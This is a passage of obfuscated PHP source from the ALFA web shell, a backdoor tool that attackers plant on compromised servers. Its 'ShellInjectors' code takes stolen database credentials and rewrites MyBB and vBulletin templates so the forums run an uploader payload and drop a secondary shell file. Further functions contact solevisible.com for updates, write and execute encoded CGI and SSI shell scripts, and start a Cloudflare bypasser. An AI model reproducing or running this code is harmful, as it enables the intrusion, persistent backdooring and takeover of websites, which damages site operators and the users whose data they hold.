}if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
AlfaNum(1,2,3,5);
echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
";
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'dbh', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'dbn', 'id'=>'db_name' ,'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'dbu', 'id'=>'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'dbp', 'id'=>'db_pw', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'prefix', 'id'=>'db_prefix','inputValue' => 'mybb_', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo $gheoiswh5b3c32009797feb79096d52e56a56b82;
echo "<p><input type=submit value=' '></p></form></center></center>";
if(isset($_POST['alfa6'])) {
$fpgvfxxse68767ea79ef0c42d8c4653b39374eda = $_POST['alfa6'];
$kqckaclr7980a849b1d26dcf210bf4fb030c6a21 = $_POST['alfa7'];
$cxvugbgf06b18ac8deaf14a6416183145c06238c = $_POST['alfa8'];
$kwizkcfd1eb267706e34aa7423b280c24efdd775 = $_POST['alfa9'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa4'];
$njeibuiufa1651ef6048d884a57f6ac5ebb77bcd = "{\${".ALFA_UPLOADER."}}";
$uovfqkfob035ad08bda3cd59628f600824fca885 = str_replace("'","\'",$njeibuiufa1651ef6048d884a57f6ac5ebb77bcd);
if (!empty($kwizkcfd1eb267706e34aa7423b280c24efdd775) && !empty($fpgvfxxse68767ea79ef0c42d8c4653b39374eda) && !empty($kqckaclr7980a849b1d26dcf210bf4fb030c6a21) && !empty($uovfqkfob035ad08bda3cd59628f600824fca885)){
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898 = mysqli_connect($kwizkcfd1eb267706e34aa7423b280c24efdd775,$fpgvfxxse68767ea79ef0c42d8c4653b39374eda,$cxvugbgf06b18ac8deaf14a6416183145c06238c,$kqckaclr7980a849b1d26dcf210bf4fb030c6a21) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$vagiaqvoa181b4673216ad247a0f78066a9646e1 = "select template from {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}templates where  title= 'calendar'";
$nmxeqhvab4a88417b3d0170d754c647c30b7216a = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $vagiaqvoa181b4673216ad247a0f78066a9646e1) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$fuczwtrf6e58093dbb06ecf3eeb0af38e8c595bb = mysqli_fetch_assoc($nmxeqhvab4a88417b3d0170d754c647c30b7216a);
$rmobaiowaf4d9472164db1977fb80dd6fdbc3cc7 = $fuczwtrf6e58093dbb06ecf3eeb0af38e8c595bb['template'];
$cafoczgf137bc5ce25fe8315f059c27d565ff683 = str_replace($njeibuiufa1651ef6048d884a57f6ac5ebb77bcd,"",$rmobaiowaf4d9472164db1977fb80dd6fdbc3cc7);
$cafoczgf137bc5ce25fe8315f059c27d565ff683 = str_replace("'","\'",$cafoczgf137bc5ce25fe8315f059c27d565ff683);
$hmydfavmc109d32ba56199a6bed232dca4c6a9bd = "update {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}templates SET template= '".$uovfqkfob035ad08bda3cd59628f600824fca885.$cafoczgf137bc5ce25fe8315f059c27d565ff683."' where title = 'calendar'";
$ecwemfrq486a9bbc2c582b30c8899b6f20a7e59e = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$hmydfavmc109d32ba56199a6bed232dca4c6a9bd) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$jxnfsvuo6b72d14a2b5f0d92a740ccb55a2599d8 = "select value from {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}settings where name= 'bburl'";
$zjytqmxl2a840ec0a659d6253eb19b51d4590a34 = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$jxnfsvuo6b72d14a2b5f0d92a740ccb55a2599d8) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$cegxxvpzddb80dbc3f392dbc92cc7503a917bc2c = mysqli_fetch_assoc($zjytqmxl2a840ec0a659d6253eb19b51d4590a34);
$wofnllibcaada241d2c66add02282b7049cb796b = $cegxxvpzddb80dbc3f392dbc92cc7503a917bc2c['value'];
$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5 = parse_url($wofnllibcaada241d2c66add02282b7049cb796b,PHP_URL_HOST);
$qixiukvof1717c0d3bb9106455d837859192864e = parse_url($wofnllibcaada241d2c66add02282b7049cb796b,PHP_URL_PATH);
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = false;
$qtzwvaxf0f3bcb5d866baa3eb38bf9b21ee8d4f3 = new AlfaCURL();
if (extension_loaded('sockets') && function_exists('fsockopen') && $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto' ){
if ($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650 = @fsockopen($hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5, 80, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 10)){
@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "GET $qixiukvof1717c0d3bb9106455d837859192864e/calendar.php HTTP/1.1\r\n");
@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "HOST: $hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5\r\n");
@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "Connection: close\r\n\r\n");
$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = fgets($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650);
if(preg_match("/200 OK/i",$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87)){
$awhcmbbl2b6f1ba86c32649959d9371e01d771db = "update {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}templates SET template= '$cafoczgf137bc5ce25fe8315f059c27d565ff683' where title = 'calendar'";
$atcoqgyn01bc6f8efa4202821e95f4fdf6298b30 = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$awhcmbbl2b6f1ba86c32649959d9371e01d771db) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = true;}
@fclose($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650);}}elseif(function_exists('curl_version')&& $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto'){
$qtzwvaxf0f3bcb5d866baa3eb38bf9b21ee8d4f3->Send($hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/calendar.php");
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = true;
}
if($ybaqpbzt9b207167e5381c47682c6b4f58a623fb){
$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/solevisible.php";
output($uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31);
}else{
$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/calendar.php";
$lkcqmele343d9040a671c45832ee5381860e2996 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/solevisible.php";
echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='".$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31."' target='_blank'>".$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31."</a><br/><font color='#FFFFFF'>And Go To => </font><a href='".$lkcqmele343d9040a671c45832ee5381860e2996."' target='_blank'>".$lkcqmele343d9040a671c45832ee5381860e2996."</a></b></center><br><br>";
}}}}
if(isset($_POST['alfa3']) && $_POST['alfa3']== 'vb'){
AlfaNum(1,2,7,9,10);
echo __pre().'<p><div class="txtfont_header">| vbulletin |</div></p><p>'.getConfigHtml('vb').'</p><form name="frm" method="POST" onsubmit="g(\'ShellInjectors\',null,null,this.lo.value,\'vb\',this.user.value,this.pass.value,this.tab.value,this.db.value,this.method.value); return false;">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'lo', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'db', 'id'=>'db_name','inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'user', 'id'=>'db_user','inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'pass', 'id'=>'db_pw','inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'tab', 'id'=>'db_prefix','inputValue' => '', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo $gheoiswh5b3c32009797feb79096d52e56a56b82;
echo '<p><input type="submit" value=" " /></p></form></center>';
if(isset($_POST['alfa4'])&&!empty($_POST['alfa4'])){
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa8'];
$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8 = "faq";
$hrtpbjqu96de4270c62b50d81d50b79979c2f176 = "/faq.php";
$nndigmblc13367945d5d4c91047b3b50234aa7ab = "{\${".ALFA_UPLOADER."}}{\${exit()}}&";
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5'],$_POST['alfa7']) or die(@mysqli_connect_error());
$oulgydyw0b2c082c00e002a2f571cbe340644239 = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
$vdbzowipec3b61eb147ecad9e7e8669500b5b5ba = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$oulgydyw0b2c082c00e002a2f571cbe340644239);
$erjqjwtqbaf98aca18c12af1244f41f2a37a2915 = @mysqli_fetch_assoc($vdbzowipec3b61eb147ecad9e7e8669500b5b5ba);
$wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8 = $erjqjwtqbaf98aca18c12af1244f41f2a37a2915['template'];
if(empty($wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8)){
	$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8 = "header";
	$hrtpbjqu96de4270c62b50d81d50b79979c2f176 = "/";
	$oulgydyw0b2c082c00e002a2f571cbe340644239 = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
	$vdbzowipec3b61eb147ecad9e7e8669500b5b5ba = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$oulgydyw0b2c082c00e002a2f571cbe340644239);
	$erjqjwtqbaf98aca18c12af1244f41f2a37a2915 = @mysqli_fetch_assoc($vdbzowipec3b61eb147ecad9e7e8669500b5b5ba);
	$wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8 = $erjqjwtqbaf98aca18c12af1244f41f2a37a2915['template'];
	$nndigmblc13367945d5d4c91047b3b50234aa7ab = ALFA_UPLOADER.";";
}
$nndigmblc13367945d5d4c91047b3b50234aa7ab = str_replace("'","\'",$nndigmblc13367945d5d4c91047b3b50234aa7ab);
$fxuvmwpb83878c91171338902e0fe0fb97a8c47a = "UPDATE ".$_POST['alfa6']."template SET `template`='".$nndigmblc13367945d5d4c91047b3b50234aa7ab."' WHERE `title`='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
$pgapzbvo2c68e1d50809e4ae357bcffe1fc99d2a= @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$fxuvmwpb83878c91171338902e0fe0fb97a8c47a) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$jxnfsvuo6b72d14a2b5f0d92a740ccb55a2599d8 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select `value` from ".$_POST['alfa6']."setting WHERE `varname`='bburl'");
$nzywpaqdbbbd3f37a459b4dde4d3ba35c09e60d9 = @mysqli_fetch_assoc($jxnfsvuo6b72d14a2b5f0d92a740ccb55a2599d8);
$dmwiusteeb1b9a42cc6261763640a6ff0b4dff70 = $nzywpaqdbbbd3f37a459b4dde4d3ba35c09e60d9['value'];
if($ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8 == "header"){
	if(substr($dmwiusteeb1b9a42cc6261763640a6ff0b4dff70, -5, 5) == "/core"){
		$dmwiusteeb1b9a42cc6261763640a6ff0b4dff70 = substr($dmwiusteeb1b9a42cc6261763640a6ff0b4dff70, 0, -5);
	}
}
$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5 = parse_url($dmwiusteeb1b9a42cc6261763640a6ff0b4dff70,PHP_URL_HOST);
$qixiukvof1717c0d3bb9106455d837859192864e = parse_url($dmwiusteeb1b9a42cc6261763640a6ff0b4dff70,PHP_URL_PATH);
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = false;
$qtzwvaxf0f3bcb5d866baa3eb38bf9b21ee8d4f3 = new AlfaCURL();
if(extension_loaded('sockets') && function_exists('fsockopen') && $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto'){
if($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650 = @fsockopen($hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5, 80, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 10)){
@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "GET $qixiukvof1717c0d3bb9106455d837859192864e.$hrtpbjqu96de4270c62b50d81d50b79979c2f176 HTTP/1.1\r\n");
@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "HOST: $hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5\r\n");
@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "Connection: close\r\n\r\n");
$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = fgets($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650);
if(preg_match("/200 OK/i",$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87)){
$ccwcuucaec6ef230f1828039ee794566b9c58adc = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8)."' WHERE title ='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
$fvltfwqj38435cfe0222f21389afa61c215a6baa= @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$ccwcuucaec6ef230f1828039ee794566b9c58adc) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = true;
}
@fclose($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650);
}
}elseif(function_exists('curl_version') && $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto'){
$qtzwvaxf0f3bcb5d866baa3eb38bf9b21ee8d4f3->Send($hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e.$hrtpbjqu96de4270c62b50d81d50b79979c2f176);
$ccwcuucaec6ef230f1828039ee794566b9c58adc = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8)."' WHERE title ='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
$fvltfwqj38435cfe0222f21389afa61c215a6baa= @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$ccwcuucaec6ef230f1828039ee794566b9c58adc) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = true;
}
if($ybaqpbzt9b207167e5381c47682c6b4f58a623fb){
$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/solevisible.php";
output($uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31);
}else{
$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e.$hrtpbjqu96de4270c62b50d81d50b79979c2f176;
$lkcqmele343d9040a671c45832ee5381860e2996 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/solevisible.php";
echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='".$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31."' target='_blank'>".$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31."</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='".$lkcqmele343d9040a671c45832ee5381860e2996."' target='_blank'>".$lkcqmele343d9040a671c45832ee5381860e2996."</a></center></p>";}}}
echo '</div>';
alfafooter();
}
function alfacheckfiletype(){
	$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['path'];
	$mcpievhm61dd86c2dc75c3f569ec619bd283a33f = $_POST['arg'];
	if(@is_file($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.'/'.$mcpievhm61dd86c2dc75c3f569ec619bd283a33f)){
		echo("file");
	}else{
		echo("dir");
	}
}
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["alfacgiapi_mode"])&&!isset($_COOKIE["alfacgiapi"])){
			_alfa_cgicmd("whoami","perl",true);
			if(strlen(alfaEx("whoami",false,true))>0){
				__alfa_set_cookie("alfa_canruncmd", "true");
			}
		}
	}
	if(function_exists("curl_version")){
		$fflfxfri3ac340832f29c11538fbe2d6f75e8bcc = new AlfaCURL();
		$enjzynvd466deec76ecdf5fca6d38571f6324d54 = $fflfxfri3ac340832f29c11538fbe2d6f75e8bcc->Send("http://solevisible.com/update.json?ver=".__ALFA_VERSION__);
		$enjzynvd466deec76ecdf5fca6d38571f6324d54 = @json_decode($enjzynvd466deec76ecdf5fca6d38571f6324d54,true);
		$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array();
		if($enjzynvd466deec76ecdf5fca6d38571f6324d54){
			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["type"])){
				if($enjzynvd466deec76ecdf5fca6d38571f6324d54["type"] == "update"){
					if(__ALFA_VERSION__ != $enjzynvd466deec76ecdf5fca6d38571f6324d54['version'] || __ALFA_UPDATE__ != $enjzynvd466deec76ecdf5fca6d38571f6324d54['version_number']){
						@setcookie("alfa_checkupdate", "1", time()+86400);
						$sfmsaibm8d777f385d3dfec8815d20f7496026dc["content"] = '<div class="update-holder">'.$enjzynvd466deec76ecdf5fca6d38571f6324d54["content"].'</div>';
					}
				}
			}
			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["ads"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["ads"])){
				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["content"] .= $enjzynvd466deec76ecdf5fca6d38571f6324d54["ads"];
			}
			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["copyright"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["copyright"])){
				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["copyright"] = $enjzynvd466deec76ecdf5fca6d38571f6324d54["copyright"];
			}
			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["solevisible"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["solevisible"])){
				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["solevisible"] = $enjzynvd466deec76ecdf5fca6d38571f6324d54["solevisible"];
			}
			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["code_name"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["code_name"])){
				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["code_name"] = $enjzynvd466deec76ecdf5fca6d38571f6324d54["code_name"];
				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["version_number"] = __ALFA_VERSION__;
			}
			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["market"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["market"])){
				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["market"] = $enjzynvd466deec76ecdf5fca6d38571f6324d54["market"];
			}
			echo @json_encode($sfmsaibm8d777f385d3dfec8815d20f7496026dc);
		}
	}
}
function alfaWriteTocgiapi($kkkpgnftb068931cc450442b63f5b3d276ea4297, $kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb){
	$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = "";
	$zfkuxglj5434fe307c9b9725fbb4ceb5e91b7e13 = array("basedir.alfa", "getdir.alfa", "getheader.alfa");
	if(in_array($kkkpgnftb068931cc450442b63f5b3d276ea4297, $zfkuxglj5434fe307c9b9725fbb4ceb5e91b7e13)){
		$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = ALFA_TEMPDIR;
		if($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f){
			@chdir($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f);
		}
	}else{
		alfaCreateParentFolder();
		@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
	}
	@mkdir('alfacgiapi',0755);
	__write_file("alfacgiapi/".$kkkpgnftb068931cc450442b63f5b3d276ea4297, __get_resource($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb));
	@chmod("alfacgiapi/".$kkkpgnftb068931cc450442b63f5b3d276ea4297, 0755);
	return $dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f;
}
function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		$ozurlglxd574d4bb40c84861791a694a999cce69 = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
		$nmetxdku8dd6ad7684b79ac5ea8914ed4de6eb0f = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
		$fjvlsuooad616a4bf9c50c6d567971ff896b5f29 = alfaWriteTocgiapi("getheader.alfa",$ozurlglxd574d4bb40c84861791a694a999cce69);
		$sfmsaibm8d777f385d3dfec8815d20f7496026dc = alfaEx("cd '{$fjvlsuooad616a4bf9c50c6d567971ff896b5f29}/alfacgiapi';sh getheader.alfa",false,true,true);
		if(@is_array(@json_decode($sfmsaibm8d777f385d3dfec8815d20f7496026dc,true))){
			__alfa_set_cookie("updateheader_data", __ZW5jb2Rlcg($sfmsaibm8d777f385d3dfec8815d20f7496026dc));
			echo $sfmsaibm8d777f385d3dfec8815d20f7496026dc;
		}
	}else{
		echo __ZGVjb2Rlcg($_COOKIE["updateheader_data"]);
	}
}
function alfassiShell(){
alfahead();
echo '<div class=header>';
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
@mkdir('alfa_shtml',0755);
@chdir('alfa_shtml');
alfacgihtaccess('shtml');
$nndigmblc13367945d5d4c91047b3b50234aa7ab = 'rVb9b9s2EP1Xrky22MhsKcu6ptbH0A+vzYbCXeztl6YoZImS2VCkQFJOvCX/+46SrChOnKRBA8ORyOPju3ePR/vPBoOdWIqUZUCVynUWkE9jpaT6TAaD0O9Ma/YvTXMTkPnKUN3OshToRaEC0jslu+9ns49f3kwmfx6PTwkEcEpOSR8uL8FOnoz/+ns8nX35MJ69n7zF+Wc24N14hjEE1niaGlhGiKcXnOATL2lAuIYBj66DKNf03hVdJterRIJs8Q2+C/OPk+kW6kzELXVnOLzjQ03sFJHW58lDSXWwNpOCzawWJuehv6BREvqGGU7DVzyNYEajHKbTY5guKOe+U0/5OlasMMAjkZVRhlS/RsuoHiRhWorYMCkgkcz0IJcJhT78x9IejsRlToUZxlKeMWrFIMROIl+oxzQquBE21AW3SMTDWC+VqmfzA4aRrof//PXSIaciMwsP9vcZ9Dc3C9Zhn3DNZ9hHPCwiU1QHs0X5E7gH8Eck4ODlCxdcd1R94N2HGfGubkO1Ixk1Y07t4+vVcbJOd1jJ7rVRXMaR1WSoKJdR0ut7V61MRmYZpz1giVViO7KdH2qz4nSYMJQkWiGP3jeFo9xCCor2/A3IHEmdERg1Y96V79QlDH2nNsJcJiuQwjIOyLaN9mKZ55FI9vrDFEM05kZgnsWSS/Tgjlv9EYg4E2fYAVAWNGXnBbdRoZ+wZejHiEnxZXEY+qkUBtYgz1/G8eEhCS/hDlfCpe/YaEsbFzprFAvbPod+2WDaZhSQ/QOCmcWcxcijqcAeFcs9y75SLSBxqbRUo0IyC+JVZEaKJh4Jx2LJlLQaABOpbAngJs68wwHTwkIEBJFb2KYaI6t6A7rz64tXr9/+7jViFIrWR7lQdmuxtEfbqUbttFOJVX/f0u5xmWK/e2Smb+rqAh470HUT2JJrTchmjLXOBKJWEwTOWWIWATlw3R/QGVIlFGuKlrDCVI23YTGP4rNMyVIkg0aW2jzezZ57/31QNcUbEt9sdY3E8w2H1QWwhUXK0Fi6TXUejn4Uc1143W8EUDnk1CwkJoKnwuqsy3nOjD0t2LGuj4atLBNFacCsCkzV0AsMrwt01EjRBJOwge/G17DtzXBSCgR0LIFbPt8o/WaCJ1SX3HQyu3lgLLFI0ahzgukv1E2OKiSNVfwZQZU8t4/PSXP9XNAY4jwJdrGc1T3krHHwaql8AX5r129zKl5ij3TqpKCqarIaUSBlnOoHz2V1RT7Srt/JpfXdX9m0Rny6Wf9h9LxKFHrYjkwZcexGMS8T2h91KvyQdQup7/Du0gLf69wjt9KwCnySa7flNUX0BxLYtrTSL7X0oJEk2EVNrJj1yuonaNf+T3Z9I/WtfTrmv9WuHXul2ovK/tz6Hw==';
@__write_file('alfa_ssi.shtml',__get_resource($nndigmblc13367945d5d4c91047b3b50234aa7ab));
@chmod("alfa_ssi.shtml",0755);
echo AlfaiFrameCreator('alfa_shtml/alfa_ssi.shtml');
echo '</div>';
alfafooter();
}
function alfacloudflare(){
alfahead();
AlfaNum(8,9,10,7,6,5,4,3);
echo "<div class=header><center><br><div class='txtfont_header'>| Cloud Flare ByPasser |</div><br><form action='' onsubmit=\"g('cloudflare',null,this.url.value,'>>'); return false;\" method='post'>
